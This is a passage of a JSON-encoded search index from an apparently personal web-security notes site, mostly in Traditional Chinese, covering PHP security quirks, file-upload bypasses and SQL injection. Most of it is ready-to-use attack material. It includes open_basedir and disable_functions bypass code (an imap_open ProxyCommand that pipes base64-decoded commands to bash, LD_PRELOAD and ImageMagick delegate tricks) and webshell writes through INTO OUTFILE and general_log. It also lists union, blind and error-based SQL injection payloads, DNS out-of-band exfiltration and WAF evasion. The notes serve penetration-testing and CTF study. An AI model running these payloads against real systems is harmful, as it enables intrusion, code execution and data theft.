\u539f\u7406\uff1asprintf\u5be6\u4f5c\u662f\u7528switch\u2026case\u2026 \u78b0\u5230\u672a\u77e5\u985e\u578b\uff0cdefault\u4e0d\u8655\u7406 file_put_contents \u7b2c\u4e8c\u500b\u53c3\u6578\u5982\u679c\u662f\u9663\u5217\uff0cPHP\u6703\u628a\u5b83\u4e32\u63a5\u6210\u5b57\u4e32 example: &lt;?php $test = $_GET['txt']; if(preg_match('[&lt;&gt;?]', $test)) die('bye'); file_put_contents('output', $test); \u53ef\u4ee5\u76f4\u63a5?txt[]=&lt;?php phpinfo(); ?&gt;\u5beb\u5165 spl_autoload_register spl_autoload_register()\u53ef\u4ee5\u81ea\u52d5\u8f09\u5165Class \u4e0d\u6307\u5b9a\u53c3\u6578\uff0c\u6703\u81ea\u52d5\u8f09\u5165.inc\u548c.php Example: \u5982\u679c\u76ee\u9304\u4e0b\u6709kaibro.inc\uff0c\u4e14\u5167\u5bb9\u70baclass Kaibro{\u2026} \u5247spl_autoload_register()\u6703\u628a\u9019\u500bClass\u8f09\u5165\u9032\u4f86 \u8def\u5f91\u6b63\u898f\u5316 a.php\/. file_put_contents(&quot;a.php\/.&quot;, &quot;&lt;?php phpinfo() ?&gt;&quot;); \u53ef\u6210\u529f\u5beb\u5165 \u7d93\u6e2c\u8a66Windows\u53ef\u4ee5\u8986\u5beb\u3001Linux\u7121\u6cd5 \u53ef\u4ee5\u7e5e\u904e\u4e00\u4e9b\u6b63\u898f\u8868\u9054\u5f0f\u5224\u65b7 file_get_contents(&quot;a.php\/.&quot;); \u7d93\u6e2c\u8a66Windows\u4e0b\u53ef\u6210\u529f\u8b80\u3001Linux\u7121\u6cd5 \u9084\u6709\u5f88\u591a\u5176\u4ed6function\u4e5f\u9069\u7528 &quot; =&gt; . a&quot;php &gt; =&gt; ? a.p&gt;p a.&gt;&gt;&gt; &lt; =&gt; * a.&lt; URL query decode $_GET\u6703\u5c0d\u50b3\u5165\u7684\u53c3\u6578\u505aURLdecode\u518d\u8fd4\u56de $_SERVER['REQUEST_URI']\u548c$_SERVER['QUERY_STRING']\u5247\u662f\u76f4\u63a5\u8fd4\u56de Example: Request: http:\/\/kaibro.tw\/test.php?url=%67%67 $_GET: [url] =&gt; gg $_SERVER[\u2018REQUEST_URI\u2019]: \/test.php?url=%67%67 $_SERVER[\u2018QUERY_STRING\u2019]: url=%67%67 OPcache \u900f\u904e\u5c07PHP\u8173\u672c\u7de8\u8b6f\u6210Byte code\u7684\u65b9\u5f0f\u505aCache\u4f86\u63d0\u5347\u6027\u80fd \u76f8\u95dc\u8a2d\u5b9a\u5728php.ini\u4e2d opcache.enable \u662f\u5426\u555f\u7528 opcache.file_cache \u8a2d\u5b9acache\u76ee\u9304 \u4f8b\u5982:opcache.file_cache=&quot;\/tmp\/opcache&quot; \/var\/www\/index.php\u7684\u66ab\u5b58\u6703\u653e\u5728\/tmp\/opcache\/[system_id]\/var\/www\/index.php.bin opcache.file_cache_only \u8a2d\u5b9acache\u6587\u4ef6\u512a\u5148\u7d1a opcache.validate_timestamps \u662f\u5426\u555f\u7528timestamp\u9a57\u8b49 system_id\u662f\u900f\u904eZend\u548cPHP\u7248\u672c\u865f\u8a08\u7b97\u51fa\u4f86\u7684\uff0c\u53ef\u4ee5\u78ba\u4fdd\u76f8\u5bb9\u6027 \u6240\u4ee5\u5728\u67d0\u4e9b\u689d\u4ef6\u4e0b\u53ef\u900f\u904e\u4e0a\u50b3\u8986\u84cb\u66ab\u5b58\u6587\u4ef6\u4f86\u5bebwebshell system_id\u8981\u548c\u76ee\u6a19\u6a5f\u5668\u4e00\u6a23 timestamp\u8981\u4e00\u81f4 https:\/\/github.com\/GoSecure\/php7-opcache-override Disassembler\u53ef\u4ee5\u628aByte code\u8f49\u6210Pseudo code PCRE\u56de\u6eaf\u6b21\u6578\u9650\u5236\u7e5e\u904e PHP\u7684PCRE\u5eab\u4f7f\u7528NFA\u4f5c\u70ba\u6b63\u898f\u8868\u9054\u5f0f\u5f15\u64ce NFA\u5728\u5339\u914d\u4e0d\u4e0a\u6642\uff0c\u6703\u56de\u6eaf\u5617\u8a66\u5176\u4ed6\u72c0\u614b PHP\u70ba\u9632\u6b62DOS\uff0c\u8a2d\u5b9a\u4e86PCRE\u56de\u6eaf\u6b21\u6578\u4e0a\u9650 pcre.backtrack_limit \u9810\u8a2d\u70ba1000000 \u56de\u6eaf\u6b21\u6578\u8d85\u904e\u4e0a\u9650\u6642\uff0cpreg_match()\u6703\u8fd4\u56defalse Example Code-Breaking Puzzles - pcrewaf open_basedir\u7e5e\u904e glob \u5217\u76ee\u9304 $file_list = array(); $it = new DirectoryIterator(\"glob:\/\/\/*\"); foreach($it as $f) { $file_list[] = $f-&gt;__toString(); } sort($file_list); foreach($file_list as $f){ echo \"{$f}&lt;br\/&gt;\"; } phuck3 chdir('img'); ini_set('open_basedir','..'); chdir('..');chdir('..'); chdir('..');chdir('..'); ini_set('open_basedir','\/'); echo(file_get_contents('flag')); symlinks mkdir('\/var\/www\/html\/a\/b\/c\/d\/e\/f\/g\/',0777,TRUE); symlink('\/var\/www\/html\/a\/b\/c\/d\/e\/f\/g','foo'); ini_set('open_basedir','\/var\/www\/html:bar\/'); symlink('foo\/..\/..\/..\/..\/..\/..\/','bar'); unlink('foo'); symlink('\/var\/www\/html\/','foo'); echo file_get_contents('bar\/etc\/passwd'); Fastcgi link \u2026 disable_functions\u7e5e\u904e bash shellshock mail() sendmail putenv\u5bebLD_PRELOAD trick: LD_PRELOAD without sendmail\/getuid() imap_open() &lt;?php $payload = \"echo hello|tee \/tmp\/executed\"; $encoded_payload = base64_encode($payload); $server = \"any -o ProxyCommand=echo\\t\".$encoded_payload.\"|base64\\t-d|bash\"; @imap_open('{'.$server.'}:143\/imap}INBOX', '', ''); error_log() \u7b2c\u4e8c\u500b\u53c3\u6578message_type\u70ba1\u6642\uff0c\u6703\u53bb\u8abf\u7528sendmail ImageMagick Command Injection LD_PRELOAD + ghostscript: Imagemagick\u6703\u7528ghostscript\u53bbparse eps Link LD_PRELOAD + ffpmeg Link MAGICK_CODER_MODULE_PATH it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory Document Link MAGICK_CONFIGURE_PATH delegates.xml\u5b9a\u7fa9\u8655\u7406\u5404\u7a2e\u6587\u4ef6\u7684\u898f\u5247 \u53ef\u4ee5\u7528putenv\u5beb\u6389\u8a2d\u5b9a\u6a94\u8def\u5f91 Link &lt;delegatemap&gt; &lt;delegate decode=\"ps:alpha\" command=\"sh -c &amp;quot;\/readflag &gt; \/tmp\/output&amp;quot;\"\/&gt; &lt;\/delegatemap&gt; \u84cbPATH + ghostscript: \u9020\u4e00\u500b\u57f7\u884c\u6a94gs #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { unsetenv(\"PATH\"); const char* cmd = getenv(\"CMD\"); system(cmd); return 0; } putenv('PATH=\/tmp\/mydir'); putenv('CMD=\/readflag &gt; \/tmp\/mydir\/output'); chmod('\/tmp\/mydir\/gs','0777'); $img = new Imagick('\/tmp\/mydir\/1.ept'); dl() \u8f09\u5165module dl(&quot;rce.so&quot;) FFI PHP 7.4 feature preloading + ffi e.g. RCTF 2019 - nextphp Extension l3mon\/Bypass_Disable_functions_Shell JSON UAF Bypass 7.1 - all versions to date 7.2 &lt; 7.2.19 (released: 30 May 2019) 7.3 &lt; 7.3.6 (released: 30 May 2019) GC Bypass 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 - all versions to date \u65cf\u7e41\u4e0d\u53ca\u5099\u8f09\u2026\u2026 \u5176\u4ed6 \u5927\u5c0f\u5beb\u4e0d\u654f\u611f &lt;?PhP sYstEm(ls); Array Bracket $array[87] === $array{87} Double Quote Evaluation $msg = &quot;hello, $name&quot; $msg = &quot;${@phpinfo()}&quot; echo (true ? 'a' : false ? 'b' : 'c'); b echo `whoami`; kaibro \u6b63\u898f\u8868\u9054\u5f0f.\u4e0d\u5339\u914d\u63db\u884c\u5b57\u5143%0a \u6b63\u898f\u8868\u9054\u5f0f\u5e38\u898b\u8aa4\u7528: preg_match(&quot;\/\\\\\/&quot;, $str) \u5339\u914d\u53cd\u659c\u7dda\u61c9\u8a72\u8981\u7528\\\\\\\\\u800c\u4e0d\u662f\\\\ \u904b\u7b97\u512a\u5148\u6b0a\u554f\u984c $a = true &amp;&amp; false; $a =&gt; false $a = true and false; $a =&gt; true chr() \u5927\u65bc256\u6703mod 256 \u5c0f\u65bc0\u6703\u52a0\u4e0a256\u7684\u500d\u6578\uff0c\u76f4\u5230&gt;0 Example: chr(259) === chr(3) chr(-87) === chr(169) \u905e\u589e $a=&quot;9D9&quot;; var_dump(++$a); string(3) &quot;9E0&quot; $a=&quot;9E0&quot;; var_dump(++$a); float(10) \u7b97\u6578\u904b\u7b97\u7e5eFilter %f3%f9%f3%f4%e5%ed &amp; %7f%7f%7f%7f%7f%7f system \u53ef\u7528\u5728\u9650\u5236\u4e0d\u80fd\u51fa\u73fe\u82f1\u6578\u5b57\u6642 or \u904e\u6ffe\u67d0\u4e9b\u7279\u6b8a\u7b26\u865f $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); assert \u5176\u4ed6 ~, ++\u7b49\u904b\u7b97\uff0c\u4e5f\u90fd\u53ef\u7528\u985e\u4f3c\u6982\u5ff5\u69cb\u9020 \u82b1\u62ec\u865f \u9663\u5217\u3001\u5b57\u4e32\u5143\u7d20\u5b58\u53d6\u53ef\u7528\u82b1\u62ec\u865f $array{index}\u540c$array[index] filter_var filter_var('http:\/\/evil.com;google.com', FILTER_VALIDATE_URL) False filter_var('0:\/\/evil.com;google.com', FILTER_VALIDATE_URL) True json_decode \u4e0d\u76f4\u63a5\u5403\u63db\u884c\u5b57\u5143\u548c\\t\u5b57\u5143 \u4f46\u53ef\u4ee5\u5403\u2019\\n\u2019\u548c\u2019\\t\u2019 \u6703\u8f49\u6210\u63db\u884c\u5b57\u5143\u548cTab \u4e5f\u5403\\uxxxx\u5f62\u5f0f json_decode('{&quot;a&quot;:&quot;\\u0041&quot;}') === bug var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]) \u67d0\u4e9b\u7248\u672c\u6703\u662fTrue ASIS 2018 Qual Nice Code https:\/\/3v4l.org\/sUEMG openssl_verify \u9810\u6e2c\u63a1\u7528SHA1\u4f86\u505a\u7c3d\u540d\uff0c\u53ef\u80fd\u6709SHA1 Collision\u554f\u984c DEFCON CTF 2018 Qual Namespace PHP\u7684\u9810\u8a2dGlobal space\u662f\\ e.g. \\system('ls');","tags":"","url":"Web_Application_Attack\/PHP_Feature_in_Security.html"},{"title":"File Upload Vulnerability","text":"File Upload Vulnerability Table of Contents File Upload Vulnerability tags: Security Web Types File-based Route-based Java-based Bypass Javascript Detection MIME type (media type) Detection Extension Black list Magic Number Other tags: Security Web Types File-based \u4e0a\u50b3 Webshell\u3001\uf9b9\u610f\u6587\u4ef6 Route-based Java-based Bypass Javascript Detection Burp Suite \u4e2d\u9593\u4fee\u6539 disable javascript MIME type (media type) Detection Burp\u4fee\u6539Content-Type Extension Black list \u5927\u5c0f\u5beb\u7e5e\u904e pHP \/\/ (Windows) AsP \/\/ (Windows) \u7a7a\u683c \/ \u9ede \u7e5e\u904e .php (\u7a7a\u683c) \/\/ burp\u4fee\u6539 (Windows) .asp. php3457 .php3 .php4 .php5 .php7 .pht .phtml .htaccess \u81ea\u8a02\u89e3\u6790\u898f\u5247 &lt;FilesMatch &quot;wfw&quot;&gt; SetHandler application\/x-httpd-php &lt;\/FilesMatch&gt; Appache \u89e3\u6790\u6f0f\u6d1e \u8a2d\u5b9a\u6a94\u914d\u7f6e\u932f\u8aa4 AddType application\/x-httpd-php .php shell.php.wildfootw == wildfootw \u4e0d\u8a8d\u8b58 =&gt; shell.php Magic Number PHP \u662f\u5167\u5d4c\u5f0f\u8a9e\u2f94\u8a00\uff0c\u5176\u9918\u90e8\u5206\u4e0d\u5f71\u97ff\u89e3\u6790\u2192\u69cb\u9020 [Image Magic Number] + [&lt;?php xxxxx ?&gt;] jpg FF D8 FF E0 00 10 4A 46 49 46 gif 47 49 36 38 39 61 png 89 50 4E 47 Other \u5e38\u898b\u5834\u666f\uff1a\u914d\u5408\u6587\u4ef6\u89e3\u6790\u6f0f\u6d1e","tags":"","url":"Web_Application_Attack\/File_Upload_Vulnerability.html"},{"title":"CRLF Injection","text":"CRLF Injection Table of Contents CRLF Injection tags: Security Web tags: Security Web","tags":"","url":"Web_Application_Attack\/CRLF_Injection.html"},{"title":"SQL Injection","text":"SQL Injection Table of Contents SQL Injection tags: Security Web Reference cheat sheet Exploit Advantage Recon Where SQL vulnerable input type Determine DBMS Retrieve Version Fuzzing tools Bypass Authenticate Payloads Retrieving Data Attack types Union-Based SQLi Error-Based SQLi Blind SQLi Out-of-Band SQLi MySQL SELECT \uf91d\u4f4d\u540d FROM \u5eab\u540d.\u8868\u540d WHERE \u689d\u4ef6 Union-Based Error-Based Blind Out-of-Bnad Other Knowledges MSSQL Union-Based Error-Based Blind Other Knowledges Oracle UNION-Based Error-Based Blind Out-of-band Other Knowledge SQLite Blind Other Knowledge PostgreSQL Union-Based Blind Other Knowledge Other ORM injection SQL Injection with MD5 HTTP Parameter Pollution TEMP tags: Security Web Reference \u2b50\u624b\u52d5\u6e2c\u8a66\u5165\u9580 | sushant747 OSCP guide pentestmonkey - SQL Injection Cheat Sheet Sqli-labs cheat sheet portswigger portswigger training list Exploit Advantage \u7e5e\u904e\u9a57\u8b49 \u6488\u8cc7\u6599\u5eab\u5167\u5bb9 \u53d6\u5f97\u7cfb\u7d71\u6b0a\u9650 (\u8b80\u6a94\u3001RCE) Recon Where Cookie Get Parameter Post Parameter SQL vulnerable input type Numeric\uff1a id=123 id=123*1 \u8f38\u51fa\u4e0d\u8b8a id=123\/0 \u8f38\u51fa\u6539\u8b8a id=123 and 2=2 \u8f38\u51fa\u4e0d\u8b8a id=123 and 2=3 \u8f38\u51fa\u6539\u8b8a Text\uff1a id=admin id=admin' \u5f15\u865f\u4e0d\u5339\u914d \u8f38\u51fa\u6539\u8b8a id=admin'%2b' \u5b57\u4e32\u76f8\u52a0 \u8f38\u51fa\u4e0d\u8b8a id=admin' and '1'='1 \u8f38\u51fa\u4e0d\u8b8a id=admin' and '1'='2 \u8f38\u51fa\u6539\u8b8a Numeric Input MySQL numeric function example: POW(1,1) Oracle numeric function example: BITAND(1,1) SQL Server numeric function example: SQUARE(1) Text Input MySQL concatenation example: 'abc' 'def' Oracle concatenation example: 'abc' || 'def' SQL Server concatenation example: 'abc' + 'def' Determine DBMS PortSwigger - Examining the database sqlinjection Retrieve Version ' UNION SELECT @@version-- MySQL: SELECT @@version Microsoft: SELECT @@version Oracle: SELECT banner FROM v$version WHERE rownum=1 SELECT banner FROM v$version SELECT version FROM v$instance PostgreSQL: SELECT version() Fuzzing tools wfuzz wfuzz -u http:\/\/logger.htb\/room.php?cod=1FUZZ -w \/usr\/share\/seclists\/Fuzzing\/special-chars.txt --hc 404 # hide code 404 Bypass Authenticate Payloads ' or '1'='1 Retrieving Data Attack types Union-Based SQLi \u5408\u4f75\u539f\u672c Query \u7684\u8cc7\u6599\u548c\u60f3\u6488\u7684\u8cc7\u6599\uff0c\u518d\u628a\u539f\u672c\u7684 Query \u6d88\u5931 (z.B. \u8a2d\u70ba\u4e0d\u5b58\u5728\u7684 index -1)\uff0c\u5674\u51fa\u60f3\u6488\u7684\u6771\u897f PortSwigger - UNION attacks Error-Based SQLi \u628a\u8981\u6488\u7684\u8cc7\u6599\u653e\u5165\u6703\u5674\u51fa\u4f86\u7684 Error Log Blind SQLi PortSwigger - Blind SQL injection Boolean-Based \u8f38\u51fa\u53ef\u4ee5\u5224\u65b7 True or False \uff0c\u6bd4\u5c0d\u8981\u6488\u7684\u8cc7\u6599\u7684\u9577\u5ea6\uff0c\u4e00\u500b\u5b57\u5143\u4e00\u500b\u5b57\u5143\u6bd4\u5c0d Time-Based \u8f38\u51fa\u4e0d\u80fd\u5224\u65b7 T\/F \uff0c\u6539\u7528\u88fd\u9020\u6642\u9593\u5dee\u4f86\u5224\u65b7 Out-of-Band SQLi \u5c07\u8cc7\u6599\u900f\u904e\u7db2\u8def\u5916\u50b3 MySQL SELECT \uf91d\u4f4d\u540d FROM \u5eab\u540d.\u8868\u540d WHERE \u689d\u4ef6 Union-Based Goal: SELECT a, b FROM table1 UNION SELECT c, d FROM table2 Determining the number of columns union ' UNION SELECT NULL,NULL-- ' UNION SELECT 1,2,3-- \u56e0\u70ba UNION \u8cc7\u6599\u578b\u5225\u5fc5\u9808\u8981\u4e00\u81f4 UNION \u624d\u6703\u6210\u529f\uff0c\u6240\u4ee5\u7528 NULL \u6703\u662f\u6bd4\u8f03\u597d\u7684 (\u901a\u7528) \u8a3b\u89e3 -- (\u6709\u7a7a\u767d) \u6216\u662f # order ' ORDER BY 3-- \u627e\u6700\u5927\u4e14\u6c92\u6709\u932f\u8aa4\u7684\u6578\u5b57 N Finding columns with a useful data type \u901a\u5e38\u8981 leak \u7684\u8cc7\u6599\u662f string value\uff0c\u8a66\u51fa\u54ea\u500b\u6b04\u4f4d\u662f string type ' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'-- Retrieve interesting data ' UNION SELECT username, password FROM users-- The injection point is a quoted string within the WHERE clause. The database contains a table called users with the columns username and password. AND 1=2 UNION SELECT 1, 2, password FROM admin-- Database contents SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' union select 1,2,schema_name from information_schema.schemata limit 1,1 \u7206\u8cc7\u6599\u5eab\u540d union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1 \u7206\u8868\u540d union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1 \u7206 Column \u540d MySQL User SELECT CONCAT(user, &quot;:&quot; ,password) FROM mysql.user; Error-Based \u9577\u5ea6\u9650\u5236 \u932f\u8aa4\u8a0a\u606f\u6709\u9577\u5ea6\u9650\u5236 #define ERRMSGSIZE (512) Overflow MySQL &gt; 5.5.5 overflow\u624d\u6703\u6709\u932f\u8aa4\u8a0a\u606f SELECT ~0 =&gt; 18446744073709551615 SELECT ~0 + 1 =&gt; ERROR SELECT exp(709) =&gt; 8.218407461554972e307 SELECT exp(710) =&gt; ERROR \u82e5\u67e5\u8a62\u6210\u529f\uff0c\u6703\u8fd4\u56de0 SELECT exp(~(SELECT * FROM (SELECT user())x)); ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))' select (select(!x-~0)from(select(select user())x)a); ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))' MySQL &gt; 5.5.53 \u4e0d\u6703\u986f\u793a\u67e5\u8a62\u7d50\u679c xpath extractvalue (\u6709\u9577\u5ea6\u9650\u5236\uff0c32\u4f4d) select extractvalue(1,concat(0x7e,(select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~' updatexml (\u6709\u9577\u5ea6\u9650\u5236\uff0c32\u4f4d) select updatexml(1,concat(0x7e,(select @@version),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~' \u4e3b\u9375\u91cd\u8907 select count(*) from test group by concat(version(),floor(rand(0)*2)); ERROR 1062 (23000): Duplicate entry '5.7.171' for key '&lt;group_key&gt;' \u5176\u5b83\u51fd\u6578 (5.7) select ST_LatFromGeoHash(version()); select ST_LongFromGeoHash(version()); select GTID_SUBSET(version(),1); select GTID_SUBTRACT(version(),1); select ST_PointFromGeoHash(version(),1); \u7206\u5eab\u540d\u3001\u8868\u540d\u3001\u5b57\u6bb5\u540d \u7576\u904e\u6ffeinformation_schema\u7b49\u95dc\u9375\u5b57\u6642\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u65b9\u6cd5\u7206\u5eab\u540d select 1,2,3 from users where 1=abc(); ERROR 1305 (42000): FUNCTION fl4g.abc does not exist \u7206\u8868\u540d select 1,2,3 from users where Polygon(id); select 1,2,3 from users where linestring(id); ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing \u7206Column select 1,2,3 from users where (select * from (select * from users as a join users as b)as c); ERROR 1060 (42S21): Duplicate column name 'id' select 1,2,3 from users where (select * from (select * from users as a join users as b using(id))as c); ERROR 1060 (42S21): Duplicate column name 'username' Blind Conditional id=87 and length(user())&gt;0 id=87 and length(user())&gt;100 id=87 and ascii(mid(user(),1,1))&gt;100 \u7b2c\u4e00\u500b\u5b57\u5143 id=87 or ((select user()) regexp binary '^[a-z]') \u7528\u6b63\u898f\u8868\u9054\u5f0f\u52a0\u901f Conditional Errors SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') Conditional Time Delays sleep() SELECT sleep(10) benchmark() Heavy Query id=87 and if(length(user())&gt;0, sleep(10), 1)=1 id=87 and if(length(user())&gt;100, sleep(10), 1)=1 id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1 SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') Out-of-Bnad Windows only select load_file(concat(&quot;\\\\\\\\&quot;,schema_name,&quot;.dns.kaibro.tw\/a&quot;)) from information_schema.schemata Other Knowledges information_schema \u51fa\u73fe\u5728 mysql &gt;= 5.0 select schema_name from information_schema.schemata \u5b58\u653e\u8cc7\u6599\u5eab\u540d select table_name from information_schema.tables \u5b58\u653e\u8868\u683c\u540d select column_name from information_schema.columns \u5b58\u653e\u6b04\u4f4d\u540d LIMIT N, M \u8df3\u904e\u524d N \u7b46\uff0c\u6293 M \u7b46 Substring SUBSTRING(&quot;abc&quot;, 1, 1) =&gt; \u2018a\u2019 mid(&quot;abc&quot;, 1, 1) =&gt; 'a' Ascii function ascii('A') =&gt; 65 Char function char(65) =&gt; 'a' Concatenation \u5408\u4f75\u5b57\u4e32 CONCAT('a', 'b') =&gt; 'ab' \u5982\u679c\u4efb\u4f55\u4e00\u6b04\u70baNULL\uff0c\u5247\u8fd4\u56deNULL CONCAT_WS(\u5206\u9694\u7b26, \u5b57\u4e321, \u5b57\u4e322...) CONCAT_WS('@', 'gg', 'inin') =&gt; gg@inin Cast function CAST('125e342.83' AS signed) =&gt; 125 CONVERT('23',SIGNED) =&gt; 23 Delay function sleep(5) BENCHMARK(count, expr) \u7a7a\u767d\u5b57\u5143 09 0A 0B 0C 0D A0 20 File-read function LOAD_FILE('\/etc\/passwd') TO_base64(LOAD_FILE(&quot;\/var\/www\/html\/room.php&quot;)) File-write INTO DUMPFILE \u9069\u7528binary (\u5beb\u5165\u540c\u4e00\u884c) INTO OUTFILE \u9069\u7528\u4e00\u822c\u6587\u672c (\u6709\u63db\u884c) \u5bebwebshell \u9700\u77e5\u9053\u53ef\u5beb\u8def\u5f91 UNION SELECT &quot;&lt;? system($_GET[1]);?&gt;&quot;,2,3 INTO OUTFILE &quot;\/var\/www\/html\/temp\/shell.php&quot; \u6b0a\u9650 SELECT file_priv FROM mysql.user secure-file-priv \u9650\u5236MySQL\u5c0e\u5165\u5c0e\u51fa load_file, into outfile\u7b49 \u904b\u884c\u6642\u7121\u6cd5\u66f4\u6539 MySQL 5.5.53\u524d\uff0c\u8a72\u8b8a\u6578\u9810\u8a2d\u70ba\u7a7a(\u53ef\u4ee5\u5c0e\u5165\u5c0e\u51fa) e.g. secure_file_priv=E:\\ \u9650\u5236\u5c0e\u5165\u5c0e\u51fa\u53ea\u80fd\u5728E:\\\u4e0b e.g. secure_file_priv=null \u9650\u5236\u4e0d\u5141\u8a31\u5c0e\u5165\u5c0e\u51fa secure-file-priv\u9650\u5236\u4e0b\u7528general_log\u62ffshell SET global general_log='on'; SET global general_log_file='C:\/phpStudy\/WWW\/cmd.php'; SELECT '&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;'; IF\u8a9e\u53e5 IF(condition,true-part,false-part) SELECT IF (1=1,'true','false') Hex SELECT X'5061756c'; =&gt; paul SELECT 0x5061756c; =&gt; paul SELECT 0x5061756c+0 =&gt; 1348564332 SELECT load_file(0x2F6574632F706173737764); \/etc\/passwd \u53ef\u7e5e\u904e\u4e00\u4e9bWAF e.g. \u7528\u5728\u4e0d\u80fd\u4f7f\u7528\u55ae\u5f15\u865f\u6642(' =&gt; \\') CHAR()\u4e5f\u53ef\u4ee5\u9054\u5230\u985e\u4f3c\u6548\u679c 'admin' =&gt; CHAR(97, 100, 109, 105, 110) \u8a3b\u89e3\uff1a # -- \/**\/ \u4e00\u500b*\/\u53ef\u4ee5\u9589\u5408\u524d\u9762\u591a\u500b\/* \/*! 50001 select * from test *\/ \u53ef\u63a2\u6e2c\u7248\u672c e.g. SELECT \/*!32302 1\/0, *\/ 1 FROM tablename ` MySQL &lt;= 5.5 ; PDO\u652f\u63f4\u591a\u8a9e\u53e5 Stacking Query \u9810\u8a2dPHP+MySQL\u4e0d\u652f\u63f4Stacking Query \u4f46PDO\u53ef\u4ee5Stacking Query \u5176\u5b83\uff1a @@version \u540cversion() user() current_user current_user() current user system_user() database system user database() schema() current database @@basedir MySQL\u5b89\u88dd\u8def\u5f91 @@datadir Location of db file @@plugin_dir @@hostname @@version_compile_os Operating System @@version_compile_machine @@innodb_version MD5() SHA1() COMPRESS() \/ UNCOMPRESS() group_concat() \u5408\u4f75\u591a\u689d\u7d50\u679c e.g. select group_concat(username) from users; \u4e00\u6b21\u8fd4\u56de\u6240\u6709\u4f7f\u7528\u8005\u540d greatest() greatest(a, b)\u8fd4\u56dea, b\u4e2d\u6700\u5927\u7684 greatest(1, 2)=2 1 greatest(1, 2)=1 0 between a and b \u4ecb\u65bca\u5230b\u4e4b\u9593 greatest(1, 2) between 1 and 3 1 regexp SELECT 'abc' regexp '.*' 1 Collation *_ci case insensitive collation \u4e0d\u5340\u5206\u5927\u5c0f\u5beb *_cs case sensitive collation \u5340\u5206\u5927\u5c0f\u5beb *_bin binary case sensitive collation \u5340\u5206\u5927\u5c0f\u5beb \u7e5e\u904e\u7a7a\u767d\u6aa2\u67e5 id=-1\/**\/UNION\/**\/SELECT\/**\/1,2,3 id=-1%09UNION%0DSELECT%0A1,2,3 id=(-1)UNION(SELECT(1),2,3) \u5bec\u5b57\u7bc0\u6ce8\u5165 addslashes()\u6703\u8b93'\u8b8a\\' \u5728GBK\u7de8\u78bc\u4e2d\uff0c\u4e2d\u6587\u5b57\u7528\u5169\u500bBytes\u8868\u793a \u5176\u4ed6\u591a\u5b57\u7bc0\u7de8\u78bc\u4e5f\u53ef \u4f46\u8981\u4f4e\u4f4d\u7bc4\u570d\u6709\u5305\u542b0x5c(\\) \u7b2c\u4e00\u500bByte\u8981&gt;128\u624d\u662f\u4e2d\u6587 %df' =&gt; %df\\' =&gt; \u904b' (\u6210\u529f\u9003\u9038) Order by\u6ce8\u5165 \u53ef\u4ee5\u900f\u904easc\u3001desc\u7c21\u55ae\u5224\u65b7 ?sort=1 asc ?sort=1 desc \u5f8c\u9762\u4e0d\u80fd\u63a5UNION \u5df2\u77e5\u5b57\u6bb5\u540d (\u53ef\u4ee5\u76f2\u6ce8) ?order=IF(1=1, username, password) \u5229\u7528\u5831\u932f ?order=IF(1=1,1,(select 1 union select 2)) \u6b63\u78ba ?order=IF(1=2,1,(select 1 union select 2)) \u932f\u8aa4 ?order=IF(1=1,1,(select 1 from information_schema.tables)) \u6b63\u5e38 ?order=IF(1=2,1,(select 1 from information_schema.tables)) \u932f\u8aa4 Time Based ?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) \u6b63\u5e38 ?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2\u79d2 group by with rollup ' or 1=1 group by pwd with rollup limit 1 offset 2# \u5c07\u5b57\u4e32\u8f49\u6210\u7d14\u6578\u5b57 \u5b57\u4e32 -&gt; 16\u9032\u4f4d -&gt; 10\u9032\u4f4d conv(hex(YOUR_DATA), 16, 10) \u9084\u539f\uff1aunhex(conv(DEC_DATA,10,16)) \u9700\u6ce8\u610f\u4e0d\u8981Overflow \u4e0d\u4f7f\u7528\u9017\u865f LIMIT N, M =&gt; LIMIT M OFFSET N mid(user(), 1, 1) =&gt; mid(user() from 1 for 1) UNION SELECT 1,2,3 =&gt; UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c) \u5feb\u901f\u67e5\u627e\u5e36\u95dc\u9375\u5b57\u7684\u8868 select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%'); innodb \u8868\u5f15\u64ce\u70bainnodb MySQL &gt; 5.5 innodb_table_stats\u3001innodb_table_index\u5b58\u653e\u6240\u6709\u5eab\u540d\u8868\u540d select table_name from mysql.innodb_table_stats where database_name=\u8cc7\u6599\u5eab\u540d; Example: Codegate2018 prequal - simpleCMS Bypass WAF select password =&gt; SelEcT password (\u5927\u5c0f\u5beb) select password =&gt; select\/**\/password (\u7e5e\u7a7a\u767d) select password =&gt; s%65lect%20password (URLencode) select password =&gt; select(password) (\u7e5e\u7a7a\u767d) select password =&gt; select%0apassword (\u7e5e\u7a7a\u767d) %09, %0a, %0b, %0c, %0d, %a0 select password from admin =&gt; select password \/*!from*\/ admin (MySQL\u8a3b\u89e3) information_schema.schemata =&gt; `information_schema`.schemata 